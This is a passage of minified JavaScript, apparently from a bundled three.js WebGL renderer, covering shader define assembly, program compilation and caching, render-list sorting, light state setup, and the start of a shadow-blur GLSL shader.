`),u=[jm(n),"#define SHADER_TYPE "+n.shaderType,"#define SHADER_NAME "+n.shaderName,_,n.useFog&&n.fog?"#define USE_FOG":"",n.useFog&&n.fogExp2?"#define FOG_EXP2":"",n.alphaToCoverage?"#define ALPHA_TO_COVERAGE":"",n.map?"#define USE_MAP":"",n.matcap?"#define USE_MATCAP":"",n.envMap?"#define USE_ENVMAP":"",n.envMap?"#define "+c:"",n.envMap?"#define "+d:"",n.envMap?"#define "+p:"",h?"#define CUBEUV_TEXEL_WIDTH "+h.texelWidth:"",h?"#define CUBEUV_TEXEL_HEIGHT "+h.texelHeight:"",h?"#define CUBEUV_MAX_MIP "+h.maxMip+".0":"",n.lightMap?"#define USE_LIGHTMAP":"",n.aoMap?"#define USE_AOMAP":"",n.bumpMap?"#define USE_BUMPMAP":"",n.normalMap?"#define USE_NORMALMAP":"",n.normalMapObjectSpace?"#define USE_NORMALMAP_OBJECTSPACE":"",n.normalMapTangentSpace?"#define USE_NORMALMAP_TANGENTSPACE":"",n.emissiveMap?"#define USE_EMISSIVEMAP":"",n.anisotropy?"#define USE_ANISOTROPY":"",n.anisotropyMap?"#define USE_ANISOTROPYMAP":"",n.clearcoat?"#define USE_CLEARCOAT":"",n.clearcoatMap?"#define USE_CLEARCOATMAP":"",n.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",n.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",n.dispersion?"#define USE_DISPERSION":"",n.iridescence?"#define USE_IRIDESCENCE":"",n.iridescenceMap?"#define USE_IRIDESCENCEMAP":"",n.iridescenceThicknessMap?"#define USE_IRIDESCENCE_THICKNESSMAP":"",n.specularMap?"#define USE_SPECULARMAP":"",n.specularColorMap?"#define USE_SPECULAR_COLORMAP":"",n.specularIntensityMap?"#define USE_SPECULAR_INTENSITYMAP":"",n.roughnessMap?"#define USE_ROUGHNESSMAP":"",n.metalnessMap?"#define USE_METALNESSMAP":"",n.alphaMap?"#define USE_ALPHAMAP":"",n.alphaTest?"#define USE_ALPHATEST":"",n.alphaHash?"#define USE_ALPHAHASH":"",n.sheen?"#define USE_SHEEN":"",n.sheenColorMap?"#define USE_SHEEN_COLORMAP":"",n.sheenRoughnessMap?"#define USE_SHEEN_ROUGHNESSMAP":"",n.transmission?"#define USE_TRANSMISSION":"",n.transmissionMap?"#define USE_TRANSMISSIONMAP":"",n.thicknessMap?"#define USE_THICKNESSMAP":"",n.vertexTangents&&n.flatShading===!1?"#define USE_TANGENT":"",n.vertexColors||n.instancingColor||n.batchingColor?"#define USE_COLOR":"",n.vertexAlphas?"#define USE_COLOR_ALPHA":"",n.vertexUv1s?"#define USE_UV1":"",n.vertexUv2s?"#define USE_UV2":"",n.vertexUv3s?"#define USE_UV3":"",n.pointsUvs?"#define USE_POINTS_UV":"",n.gradientMap?"#define USE_GRADIENTMAP":"",n.flatShading?"#define FLAT_SHADED":"",n.doubleSided?"#define DOUBLE_SIDED":"",n.flipSided?"#define FLIP_SIDED":"",n.shadowMapEnabled?"#define USE_SHADOWMAP":"",n.shadowMapEnabled?"#define "+l:"",n.premultipliedAlpha?"#define PREMULTIPLIED_ALPHA":"",n.numLightProbes>0?"#define USE_LIGHT_PROBES":"",n.decodeVideoTexture?"#define DECODE_VIDEO_TEXTURE":"",n.decodeVideoTextureEmissive?"#define DECODE_VIDEO_TEXTURE_EMISSIVE":"",n.logarithmicDepthBuffer?"#define USE_LOGARITHMIC_DEPTH_BUFFER":"",n.reversedDepthBuffer?"#define USE_REVERSED_DEPTH_BUFFER":"","uniform mat4 viewMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;",n.toneMapping!==ri?"#define TONE_MAPPING":"",n.toneMapping!==ri?Be.tonemapping_pars_fragment:"",n.toneMapping!==ri?nA("toneMapping",n.toneMapping):"",n.dithering?"#define DITHERING":"",n.opaque?"#define OPAQUE":"",Be.colorspace_pars_fragment,eA("linearToOutputTexel",n.outputColorSpace),iA(),n.useDepthPacking?"#define DEPTH_PACKING "+n.depthPacking:"",`
`].filter(fa).join(`
`)),a=op(a),a=Hm(a,n),a=Gm(a,n),o=op(o),o=Hm(o,n),o=Gm(o,n),a=Wm(a),o=Wm(o),n.isRawShaderMaterial!==!0&&(g=`#version 300 es
`,m=[f,"#define attribute in","#define varying out","#define texture2D texture"].join(`
`)+`
`+m,u=["#define varying in",n.glslVersion===tm?"":"layout(location = 0) out highp vec4 pc_fragColor;",n.glslVersion===tm?"":"#define gl_FragColor pc_fragColor","#define gl_FragDepthEXT gl_FragDepth","#define texture2D texture","#define textureCube texture","#define texture2DProj textureProj","#define texture2DLodEXT textureLod","#define texture2DProjLodEXT textureProjLod","#define textureCubeLodEXT textureLod","#define texture2DGradEXT textureGrad","#define texture2DProjGradEXT textureProjGrad","#define textureCubeGradEXT textureGrad"].join(`
`)+`
`+u);const x=g+m+a,S=g+u+o,T=Bm(s,s.VERTEX_SHADER,x),A=Bm(s,s.FRAGMENT_SHADER,S);s.attachShader(y,T),s.attachShader(y,A),n.index0AttributeName!==void 0?s.bindAttribLocation(y,0,n.index0AttributeName):n.morphTargets===!0&&s.bindAttribLocation(y,0,"position"),s.linkProgram(y);function R(P){if(t.debug.checkShaderErrors){const z=s.getProgramInfoLog(y)||"",V=s.getShaderInfoLog(T)||"",Z=s.getShaderInfoLog(A)||"",$=z.trim(),X=V.trim(),H=Z.trim();let I=!0,J=!0;if(s.getProgramParameter(y,s.LINK_STATUS)===!1)if(I=!1,typeof t.debug.onShaderError=="function")t.debug.onShaderError(s,y,T,A);else{const K=Vm(s,T,"vertex"),ne=Vm(s,A,"fragment");Qe("THREE.WebGLProgram: Shader Error "+s.getError()+" - VALIDATE_STATUS "+s.getProgramParameter(y,s.VALIDATE_STATUS)+`

Material Name: `+P.name+`
Material Type: `+P.type+`

Program Info Log: `+$+`
`+K+`
`+ne)}else $!==""?Ne("WebGLProgram: Program Info Log:",$):(X===""||H==="")&&(J=!1);J&&(P.diagnostics={runnable:I,programLog:$,vertexShader:{log:X,prefix:m},fragmentShader:{log:H,prefix:u}})}s.deleteShader(T),s.deleteShader(A),N=new pl(s,y),b=aA(s,y)}let N;this.getUniforms=function(){return N===void 0&&R(this),N};let b;this.getAttributes=function(){return b===void 0&&R(this),b};let w=n.rendererExtensionParallelShaderCompile===!1;return this.isReady=function(){return w===!1&&(w=s.getProgramParameter(y,KT)),w},this.destroy=function(){i.releaseStatesOfProgram(this),s.deleteProgram(y),this.program=void 0},this.type=n.shaderType,this.name=n.shaderName,this.id=ZT++,this.cacheKey=e,this.usedTimes=1,this.program=y,this.vertexShader=T,this.fragmentShader=A,this}let bA=0;class wA{constructor(){this.shaderCache=new Map,this.materialCache=new Map}update(e){const n=e.vertexShader,i=e.fragmentShader,s=this._getShaderStage(n),r=this._getShaderStage(i),a=this._getShaderCacheForMaterial(e);return a.has(s)===!1&&(a.add(s),s.usedTimes++),a.has(r)===!1&&(a.add(r),r.usedTimes++),this}remove(e){const n=this.materialCache.get(e);for(const i of n)i.usedTimes--,i.usedTimes===0&&this.shaderCache.delete(i.code);return this.materialCache.delete(e),this}getVertexShaderID(e){return this._getShaderStage(e.vertexShader).id}getFragmentShaderID(e){return this._getShaderStage(e.fragmentShader).id}dispose(){this.shaderCache.clear(),this.materialCache.clear()}_getShaderCacheForMaterial(e){const n=this.materialCache;let i=n.get(e);return i===void 0&&(i=new Set,n.set(e,i)),i}_getShaderStage(e){const n=this.shaderCache;let i=n.get(e);return i===void 0&&(i=new MA(e),n.set(e,i)),i}}class MA{constructor(e){this.id=bA++,this.code=e,this.usedTimes=0}}function EA(t,e,n,i,s,r,a){const o=new $0,l=new wA,c=new Set,d=[],p=new Map,h=s.logarithmicDepthBuffer;let f=s.precision;const _={MeshDepthMaterial:"depth",MeshDistanceMaterial:"distance",MeshNormalMaterial:"normal",MeshBasicMaterial:"basic",MeshLambertMaterial:"lambert",MeshPhongMaterial:"phong",MeshToonMaterial:"toon",MeshStandardMaterial:"physical",MeshPhysicalMaterial:"physical",MeshMatcapMaterial:"matcap",LineBasicMaterial:"basic",LineDashedMaterial:"dashed",PointsMaterial:"points",ShadowMaterial:"shadow",SpriteMaterial:"sprite"};function y(b){return c.add(b),b===0?"uv":`uv${b}`}function m(b,w,P,z,V){const Z=z.fog,$=V.geometry,X=b.isMeshStandardMaterial?z.environment:null,H=(b.isMeshStandardMaterial?n:e).get(b.envMap||X),I=H&&H.mapping===ac?H.image.height:null,J=_[b.type];b.precision!==null&&(f=s.getMaxPrecision(b.precision),f!==b.precision&&Ne("WebGLProgram.getParameters:",b.precision,"not supported, using",f,"instead."));const K=$.morphAttributes.position||$.morphAttributes.normal||$.morphAttributes.color,ne=K!==void 0?K.length:0;let we=0;$.morphAttributes.position!==void 0&&(we=1),$.morphAttributes.normal!==void 0&&(we=2),$.morphAttributes.color!==void 0&&(we=3);let Pe,Ge,Ke,q;if(J){const nt=Qn[J];Pe=nt.vertexShader,Ge=nt.fragmentShader}else Pe=b.vertexShader,Ge=b.fragmentShader,l.update(b),Ke=l.getVertexShaderID(b),q=l.getFragmentShaderID(b);const O=t.getRenderTarget(),ge=t.state.buffers.depth.getReversed(),Ue=V.isInstancedMesh===!0,ye=V.isBatchedMesh===!0,Xe=!!b.map,Tt=!!b.matcap,Ve=!!H,qe=!!b.aoMap,tt=!!b.lightMap,Oe=!!b.bumpMap,pt=!!b.normalMap,k=!!b.displacementMap,yt=!!b.emissiveMap,Ze=!!b.metalnessMap,at=!!b.roughnessMap,Se=b.anisotropy>0,C=b.clearcoat>0,v=b.dispersion>0,L=b.iridescence>0,Y=b.sheen>0,Q=b.transmission>0,j=Se&&!!b.anisotropyMap,Te=C&&!!b.clearcoatMap,le=C&&!!b.clearcoatNormalMap,Me=C&&!!b.clearcoatRoughnessMap,ke=L&&!!b.iridescenceMap,re=L&&!!b.iridescenceThicknessMap,ue=Y&&!!b.sheenColorMap,be=Y&&!!b.sheenRoughnessMap,Ee=!!b.specularMap,ce=!!b.specularColorMap,ze=!!b.specularIntensityMap,D=Q&&!!b.transmissionMap,fe=Q&&!!b.thicknessMap,ae=!!b.gradientMap,me=!!b.alphaMap,ie=b.alphaTest>0,te=!!b.alphaHash,oe=!!b.extensions;let De=ri;b.toneMapped&&(O===null||O.isXRRenderTarget===!0)&&(De=t.toneMapping);const ct={shaderID:J,shaderType:b.type,shaderName:b.name,vertexShader:Pe,fragmentShader:Ge,defines:b.defines,customVertexShaderID:Ke,customFragmentShaderID:q,isRawShaderMaterial:b.isRawShaderMaterial===!0,glslVersion:b.glslVersion,precision:f,batching:ye,batchingColor:ye&&V._colorsTexture!==null,instancing:Ue,instancingColor:Ue&&V.instanceColor!==null,instancingMorph:Ue&&V.morphTexture!==null,outputColorSpace:O===null?t.outputColorSpace:O.isXRRenderTarget===!0?O.texture.colorSpace:Or,alphaToCoverage:!!b.alphaToCoverage,map:Xe,matcap:Tt,envMap:Ve,envMapMode:Ve&&H.mapping,envMapCubeUVHeight:I,aoMap:qe,lightMap:tt,bumpMap:Oe,normalMap:pt,displacementMap:k,emissiveMap:yt,normalMapObjectSpace:pt&&b.normalMapType===uw,normalMapTangentSpace:pt&&b.normalMapType===j0,metalnessMap:Ze,roughnessMap:at,anisotropy:Se,anisotropyMap:j,clearcoat:C,clearcoatMap:Te,clearcoatNormalMap:le,clearcoatRoughnessMap:Me,dispersion:v,iridescence:L,iridescenceMap:ke,iridescenceThicknessMap:re,sheen:Y,sheenColorMap:ue,sheenRoughnessMap:be,specularMap:Ee,specularColorMap:ce,specularIntensityMap:ze,transmission:Q,transmissionMap:D,thicknessMap:fe,gradientMap:ae,opaque:b.transparent===!1&&b.blending===Er&&b.alphaToCoverage===!1,alphaMap:me,alphaTest:ie,alphaHash:te,combine:b.combine,mapUv:Xe&&y(b.map.channel),aoMapUv:qe&&y(b.aoMap.channel),lightMapUv:tt&&y(b.lightMap.channel),bumpMapUv:Oe&&y(b.bumpMap.channel),normalMapUv:pt&&y(b.normalMap.channel),displacementMapUv:k&&y(b.displacementMap.channel),emissiveMapUv:yt&&y(b.emissiveMap.channel),metalnessMapUv:Ze&&y(b.metalnessMap.channel),roughnessMapUv:at&&y(b.roughnessMap.channel),anisotropyMapUv:j&&y(b.anisotropyMap.channel),clearcoatMapUv:Te&&y(b.clearcoatMap.channel),clearcoatNormalMapUv:le&&y(b.clearcoatNormalMap.channel),clearcoatRoughnessMapUv:Me&&y(b.clearcoatRoughnessMap.channel),iridescenceMapUv:ke&&y(b.iridescenceMap.channel),iridescenceThicknessMapUv:re&&y(b.iridescenceThicknessMap.channel),sheenColorMapUv:ue&&y(b.sheenColorMap.channel),sheenRoughnessMapUv:be&&y(b.sheenRoughnessMap.channel),specularMapUv:Ee&&y(b.specularMap.channel),specularColorMapUv:ce&&y(b.specularColorMap.channel),specularIntensityMapUv:ze&&y(b.specularIntensityMap.channel),transmissionMapUv:D&&y(b.transmissionMap.channel),thicknessMapUv:fe&&y(b.thicknessMap.channel),alphaMapUv:me&&y(b.alphaMap.channel),vertexTangents:!!$.attributes.tangent&&(pt||Se),vertexColors:b.vertexColors,vertexAlphas:b.vertexColors===!0&&!!$.attributes.color&&$.attributes.color.itemSize===4,pointsUvs:V.isPoints===!0&&!!$.attributes.uv&&(Xe||me),fog:!!Z,useFog:b.fog===!0,fogExp2:!!Z&&Z.isFogExp2,flatShading:b.flatShading===!0&&b.wireframe===!1,sizeAttenuation:b.sizeAttenuation===!0,logarithmicDepthBuffer:h,reversedDepthBuffer:ge,skinning:V.isSkinnedMesh===!0,morphTargets:$.morphAttributes.position!==void 0,morphNormals:$.morphAttributes.normal!==void 0,morphColors:$.morphAttributes.color!==void 0,morphTargetsCount:ne,morphTextureStride:we,numDirLights:w.directional.length,numPointLights:w.point.length,numSpotLights:w.spot.length,numSpotLightMaps:w.spotLightMap.length,numRectAreaLights:w.rectArea.length,numHemiLights:w.hemi.length,numDirLightShadows:w.directionalShadowMap.length,numPointLightShadows:w.pointShadowMap.length,numSpotLightShadows:w.spotShadowMap.length,numSpotLightShadowsWithMaps:w.numSpotLightShadowsWithMaps,numLightProbes:w.numLightProbes,numClippingPlanes:a.numPlanes,numClipIntersection:a.numIntersection,dithering:b.dithering,shadowMapEnabled:t.shadowMap.enabled&&P.length>0,shadowMapType:t.shadowMap.type,toneMapping:De,decodeVideoTexture:Xe&&b.map.isVideoTexture===!0&&Ye.getTransfer(b.map.colorSpace)===st,decodeVideoTextureEmissive:yt&&b.emissiveMap.isVideoTexture===!0&&Ye.getTransfer(b.emissiveMap.colorSpace)===st,premultipliedAlpha:b.premultipliedAlpha,doubleSided:b.side===xi,flipSided:b.side===mn,useDepthPacking:b.depthPacking>=0,depthPacking:b.depthPacking||0,index0AttributeName:b.index0AttributeName,extensionClipCullDistance:oe&&b.extensions.clipCullDistance===!0&&i.has("WEBGL_clip_cull_distance"),extensionMultiDraw:(oe&&b.extensions.multiDraw===!0||ye)&&i.has("WEBGL_multi_draw"),rendererExtensionParallelShaderCompile:i.has("KHR_parallel_shader_compile"),customProgramCacheKey:b.customProgramCacheKey()};return ct.vertexUv1s=c.has(1),ct.vertexUv2s=c.has(2),ct.vertexUv3s=c.has(3),c.clear(),ct}function u(b){const w=[];if(b.shaderID?w.push(b.shaderID):(w.push(b.customVertexShaderID),w.push(b.customFragmentShaderID)),b.defines!==void 0)for(const P in b.defines)w.push(P),w.push(b.defines[P]);return b.isRawShaderMaterial===!1&&(g(w,b),x(w,b),w.push(t.outputColorSpace)),w.push(b.customProgramCacheKey),w.join()}function g(b,w){b.push(w.precision),b.push(w.outputColorSpace),b.push(w.envMapMode),b.push(w.envMapCubeUVHeight),b.push(w.mapUv),b.push(w.alphaMapUv),b.push(w.lightMapUv),b.push(w.aoMapUv),b.push(w.bumpMapUv),b.push(w.normalMapUv),b.push(w.displacementMapUv),b.push(w.emissiveMapUv),b.push(w.metalnessMapUv),b.push(w.roughnessMapUv),b.push(w.anisotropyMapUv),b.push(w.clearcoatMapUv),b.push(w.clearcoatNormalMapUv),b.push(w.clearcoatRoughnessMapUv),b.push(w.iridescenceMapUv),b.push(w.iridescenceThicknessMapUv),b.push(w.sheenColorMapUv),b.push(w.sheenRoughnessMapUv),b.push(w.specularMapUv),b.push(w.specularColorMapUv),b.push(w.specularIntensityMapUv),b.push(w.transmissionMapUv),b.push(w.thicknessMapUv),b.push(w.combine),b.push(w.fogExp2),b.push(w.sizeAttenuation),b.push(w.morphTargetsCount),b.push(w.morphAttributeCount),b.push(w.numDirLights),b.push(w.numPointLights),b.push(w.numSpotLights),b.push(w.numSpotLightMaps),b.push(w.numHemiLights),b.push(w.numRectAreaLights),b.push(w.numDirLightShadows),b.push(w.numPointLightShadows),b.push(w.numSpotLightShadows),b.push(w.numSpotLightShadowsWithMaps),b.push(w.numLightProbes),b.push(w.shadowMapType),b.push(w.toneMapping),b.push(w.numClippingPlanes),b.push(w.numClipIntersection),b.push(w.depthPacking)}function x(b,w){o.disableAll(),w.instancing&&o.enable(0),w.instancingColor&&o.enable(1),w.instancingMorph&&o.enable(2),w.matcap&&o.enable(3),w.envMap&&o.enable(4),w.normalMapObjectSpace&&o.enable(5),w.normalMapTangentSpace&&o.enable(6),w.clearcoat&&o.enable(7),w.iridescence&&o.enable(8),w.alphaTest&&o.enable(9),w.vertexColors&&o.enable(10),w.vertexAlphas&&o.enable(11),w.vertexUv1s&&o.enable(12),w.vertexUv2s&&o.enable(13),w.vertexUv3s&&o.enable(14),w.vertexTangents&&o.enable(15),w.anisotropy&&o.enable(16),w.alphaHash&&o.enable(17),w.batching&&o.enable(18),w.dispersion&&o.enable(19),w.batchingColor&&o.enable(20),w.gradientMap&&o.enable(21),b.push(o.mask),o.disableAll(),w.fog&&o.enable(0),w.useFog&&o.enable(1),w.flatShading&&o.enable(2),w.logarithmicDepthBuffer&&o.enable(3),w.reversedDepthBuffer&&o.enable(4),w.skinning&&o.enable(5),w.morphTargets&&o.enable(6),w.morphNormals&&o.enable(7),w.morphColors&&o.enable(8),w.premultipliedAlpha&&o.enable(9),w.shadowMapEnabled&&o.enable(10),w.doubleSided&&o.enable(11),w.flipSided&&o.enable(12),w.useDepthPacking&&o.enable(13),w.dithering&&o.enable(14),w.transmission&&o.enable(15),w.sheen&&o.enable(16),w.opaque&&o.enable(17),w.pointsUvs&&o.enable(18),w.decodeVideoTexture&&o.enable(19),w.decodeVideoTextureEmissive&&o.enable(20),w.alphaToCoverage&&o.enable(21),b.push(o.mask)}function S(b){const w=_[b.type];let P;if(w){const z=Qn[w];P=Fw.clone(z.uniforms)}else P=b.uniforms;return P}function T(b,w){let P=p.get(w);return P!==void 0?++P.usedTimes:(P=new SA(t,w,b,r),d.push(P),p.set(w,P)),P}function A(b){if(--b.usedTimes===0){const w=d.indexOf(b);d[w]=d[d.length-1],d.pop(),p.delete(b.cacheKey),b.destroy()}}function R(b){l.remove(b)}function N(){l.dispose()}return{getParameters:m,getProgramCacheKey:u,getUniforms:S,acquireProgram:T,releaseProgram:A,releaseShaderCache:R,programs:d,dispose:N}}function TA(){let t=new WeakMap;function e(a){return t.has(a)}function n(a){let o=t.get(a);return o===void 0&&(o={},t.set(a,o)),o}function i(a){t.delete(a)}function s(a,o,l){t.get(a)[o]=l}function r(){t=new WeakMap}return{has:e,get:n,remove:i,update:s,dispose:r}}function AA(t,e){return t.groupOrder!==e.groupOrder?t.groupOrder-e.groupOrder:t.renderOrder!==e.renderOrder?t.renderOrder-e.renderOrder:t.material.id!==e.material.id?t.material.id-e.material.id:t.z!==e.z?t.z-e.z:t.id-e.id}function Xm(t,e){return t.groupOrder!==e.groupOrder?t.groupOrder-e.groupOrder:t.renderOrder!==e.renderOrder?t.renderOrder-e.renderOrder:t.z!==e.z?e.z-t.z:t.id-e.id}function qm(){const t=[];let e=0;const n=[],i=[],s=[];function r(){e=0,n.length=0,i.length=0,s.length=0}function a(p,h,f,_,y,m){let u=t[e];return u===void 0?(u={id:p.id,object:p,geometry:h,material:f,groupOrder:_,renderOrder:p.renderOrder,z:y,group:m},t[e]=u):(u.id=p.id,u.object=p,u.geometry=h,u.material=f,u.groupOrder=_,u.renderOrder=p.renderOrder,u.z=y,u.group=m),e++,u}function o(p,h,f,_,y,m){const u=a(p,h,f,_,y,m);f.transmission>0?i.push(u):f.transparent===!0?s.push(u):n.push(u)}function l(p,h,f,_,y,m){const u=a(p,h,f,_,y,m);f.transmission>0?i.unshift(u):f.transparent===!0?s.unshift(u):n.unshift(u)}function c(p,h){n.length>1&&n.sort(p||AA),i.length>1&&i.sort(h||Xm),s.length>1&&s.sort(h||Xm)}function d(){for(let p=e,h=t.length;p<h;p++){const f=t[p];if(f.id===null)break;f.id=null,f.object=null,f.geometry=null,f.material=null,f.group=null}}return{opaque:n,transmissive:i,transparent:s,init:r,push:o,unshift:l,finish:d,sort:c}}function CA(){let t=new WeakMap;function e(i,s){const r=t.get(i);let a;return r===void 0?(a=new qm,t.set(i,[a])):s>=r.length?(a=new qm,r.push(a)):a=r[s],a}function n(){t=new WeakMap}return{get:e,dispose:n}}function RA(){const t={};return{get:function(e){if(t[e.id]!==void 0)return t[e.id];let n;switch(e.type){case"DirectionalLight":n={direction:new B,color:new Ie};break;case"SpotLight":n={position:new B,direction:new B,color:new Ie,distance:0,coneCos:0,penumbraCos:0,decay:0};break;case"PointLight":n={position:new B,color:new Ie,distance:0,decay:0};break;case"HemisphereLight":n={direction:new B,skyColor:new Ie,groundColor:new Ie};break;case"RectAreaLight":n={color:new Ie,position:new B,halfWidth:new B,halfHeight:new B};break}return t[e.id]=n,n}}}function PA(){const t={};return{get:function(e){if(t[e.id]!==void 0)return t[e.id];let n;switch(e.type){case"DirectionalLight":n={shadowIntensity:1,shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new et};break;case"SpotLight":n={shadowIntensity:1,shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new et};break;case"PointLight":n={shadowIntensity:1,shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new et,shadowCameraNear:1,shadowCameraFar:1e3};break}return t[e.id]=n,n}}}let LA=0;function kA(t,e){return(e.castShadow?2:0)-(t.castShadow?2:0)+(e.map?1:0)-(t.map?1:0)}function NA(t){const e=new RA,n=PA(),i={version:0,hash:{directionalLength:-1,pointLength:-1,spotLength:-1,rectAreaLength:-1,hemiLength:-1,numDirectionalShadows:-1,numPointShadows:-1,numSpotShadows:-1,numSpotMaps:-1,numLightProbes:-1},ambient:[0,0,0],probe:[],directional:[],directionalShadow:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotLightMap:[],spotShadow:[],spotShadowMap:[],spotLightMatrix:[],rectArea:[],rectAreaLTC1:null,rectAreaLTC2:null,point:[],pointShadow:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[],numSpotLightShadowsWithMaps:0,numLightProbes:0};for(let c=0;c<9;c++)i.probe.push(new B);const s=new B,r=new _t,a=new _t;function o(c){let d=0,p=0,h=0;for(let b=0;b<9;b++)i.probe[b].set(0,0,0);let f=0,_=0,y=0,m=0,u=0,g=0,x=0,S=0,T=0,A=0,R=0;c.sort(kA);for(let b=0,w=c.length;b<w;b++){const P=c[b],z=P.color,V=P.intensity,Z=P.distance;let $=null;if(P.shadow&&P.shadow.map&&(P.shadow.map.texture.format===Ur?$=P.shadow.map.texture:$=P.shadow.map.depthTexture||P.shadow.map.texture),P.isAmbientLight)d+=z.r*V,p+=z.g*V,h+=z.b*V;else if(P.isLightProbe){for(let X=0;X<9;X++)i.probe[X].addScaledVector(P.sh.coefficients[X],V);R++}else if(P.isDirectionalLight){const X=e.get(P);if(X.color.copy(P.color).multiplyScalar(P.intensity),P.castShadow){const H=P.shadow,I=n.get(P);I.shadowIntensity=H.intensity,I.shadowBias=H.bias,I.shadowNormalBias=H.normalBias,I.shadowRadius=H.radius,I.shadowMapSize=H.mapSize,i.directionalShadow[f]=I,i.directionalShadowMap[f]=$,i.directionalShadowMatrix[f]=P.shadow.matrix,g++}i.directional[f]=X,f++}else if(P.isSpotLight){const X=e.get(P);X.position.setFromMatrixPosition(P.matrixWorld),X.color.copy(z).multiplyScalar(V),X.distance=Z,X.coneCos=Math.cos(P.angle),X.penumbraCos=Math.cos(P.angle*(1-P.penumbra)),X.decay=P.decay,i.spot[y]=X;const H=P.shadow;if(P.map&&(i.spotLightMap[T]=P.map,T++,H.updateMatrices(P),P.castShadow&&A++),i.spotLightMatrix[y]=H.matrix,P.castShadow){const I=n.get(P);I.shadowIntensity=H.intensity,I.shadowBias=H.bias,I.shadowNormalBias=H.normalBias,I.shadowRadius=H.radius,I.shadowMapSize=H.mapSize,i.spotShadow[y]=I,i.spotShadowMap[y]=$,S++}y++}else if(P.isRectAreaLight){const X=e.get(P);X.color.copy(z).multiplyScalar(V),X.halfWidth.set(P.width*.5,0,0),X.halfHeight.set(0,P.height*.5,0),i.rectArea[m]=X,m++}else if(P.isPointLight){const X=e.get(P);if(X.color.copy(P.color).multiplyScalar(P.intensity),X.distance=P.distance,X.decay=P.decay,P.castShadow){const H=P.shadow,I=n.get(P);I.shadowIntensity=H.intensity,I.shadowBias=H.bias,I.shadowNormalBias=H.normalBias,I.shadowRadius=H.radius,I.shadowMapSize=H.mapSize,I.shadowCameraNear=H.camera.near,I.shadowCameraFar=H.camera.far,i.pointShadow[_]=I,i.pointShadowMap[_]=$,i.pointShadowMatrix[_]=P.shadow.matrix,x++}i.point[_]=X,_++}else if(P.isHemisphereLight){const X=e.get(P);X.skyColor.copy(P.color).multiplyScalar(V),X.groundColor.copy(P.groundColor).multiplyScalar(V),i.hemi[u]=X,u++}}m>0&&(t.has("OES_texture_float_linear")===!0?(i.rectAreaLTC1=pe.LTC_FLOAT_1,i.rectAreaLTC2=pe.LTC_FLOAT_2):(i.rectAreaLTC1=pe.LTC_HALF_1,i.rectAreaLTC2=pe.LTC_HALF_2)),i.ambient[0]=d,i.ambient[1]=p,i.ambient[2]=h;const N=i.hash;(N.directionalLength!==f||N.pointLength!==_||N.spotLength!==y||N.rectAreaLength!==m||N.hemiLength!==u||N.numDirectionalShadows!==g||N.numPointShadows!==x||N.numSpotShadows!==S||N.numSpotMaps!==T||N.numLightProbes!==R)&&(i.directional.length=f,i.spot.length=y,i.rectArea.length=m,i.point.length=_,i.hemi.length=u,i.directionalShadow.length=g,i.directionalShadowMap.length=g,i.pointShadow.length=x,i.pointShadowMap.length=x,i.spotShadow.length=S,i.spotShadowMap.length=S,i.directionalShadowMatrix.length=g,i.pointShadowMatrix.length=x,i.spotLightMatrix.length=S+T-A,i.spotLightMap.length=T,i.numSpotLightShadowsWithMaps=A,i.numLightProbes=R,N.directionalLength=f,N.pointLength=_,N.spotLength=y,N.rectAreaLength=m,N.hemiLength=u,N.numDirectionalShadows=g,N.numPointShadows=x,N.numSpotShadows=S,N.numSpotMaps=T,N.numLightProbes=R,i.version=LA++)}function l(c,d){let p=0,h=0,f=0,_=0,y=0;const m=d.matrixWorldInverse;for(let u=0,g=c.length;u<g;u++){const x=c[u];if(x.isDirectionalLight){const S=i.directional[p];S.direction.setFromMatrixPosition(x.matrixWorld),s.setFromMatrixPosition(x.target.matrixWorld),S.direction.sub(s),S.direction.transformDirection(m),p++}else if(x.isSpotLight){const S=i.spot[f];S.position.setFromMatrixPosition(x.matrixWorld),S.position.applyMatrix4(m),S.direction.setFromMatrixPosition(x.matrixWorld),s.setFromMatrixPosition(x.target.matrixWorld),S.direction.sub(s),S.direction.transformDirection(m),f++}else if(x.isRectAreaLight){const S=i.rectArea[_];S.position.setFromMatrixPosition(x.matrixWorld),S.position.applyMatrix4(m),a.identity(),r.copy(x.matrixWorld),r.premultiply(m),a.extractRotation(r),S.halfWidth.set(x.width*.5,0,0),S.halfHeight.set(0,x.height*.5,0),S.halfWidth.applyMatrix4(a),S.halfHeight.applyMatrix4(a),_++}else if(x.isPointLight){const S=i.point[h];S.position.setFromMatrixPosition(x.matrixWorld),S.position.applyMatrix4(m),h++}else if(x.isHemisphereLight){const S=i.hemi[y];S.direction.setFromMatrixPosition(x.matrixWorld),S.direction.transformDirection(m),y++}}}return{setup:o,setupView:l,state:i}}function Ym(t){const e=new NA(t),n=[],i=[];function s(d){c.camera=d,n.length=0,i.length=0}function r(d){n.push(d)}function a(d){i.push(d)}function o(){e.setup(n)}function l(d){e.setupView(n,d)}const c={lightsArray:n,shadowsArray:i,camera:null,lights:e,transmissionRenderTarget:{}};return{init:s,state:c,setupLights:o,setupLightsView:l,pushLight:r,pushShadow:a}}function DA(t){let e=new WeakMap;function n(s,r=0){const a=e.get(s);let o;return a===void 0?(o=new Ym(t),e.set(s,[o])):r>=a.length?(o=new Ym(t),a.push(o)):o=a[r],o}function i(){e=new WeakMap}return{get:n,dispose:i}}const IA=`void main() {
	gl_Position = vec4( position, 1.0 );
}`,UA=`uniform sampler2D shadow_pass;
uniform vec2 resolution;
uniform float radius;
void main() {
	const float samples = float( VSM_SAMPLES );
	float mean = 0.0;
	float squared_mean = 0.0;
	float uvStride = samples <= 1.0 ? 0.0 : 2.0 / ( samples - 1.0 );
	float uvStart = samples <= 1.0 ? 0.0 : - 1.0;
	for ( float i = 0.0; i < samples; i ++ ) {
		float uvOffset = uvStart + i * uvStride;
		#ifdef HORIZONTAL_PASS
			vec2 distribution = texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( uvOffset, 0.0 ) * radius ) / resolution ).rg;
			mean += distribution.x;
			squared_mean += distribution.y * distribution.y + distribution.x * distribution.x;
		#else
			float depth = texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( 0.0, uvOffset ) * radius ) / resolution ).r;
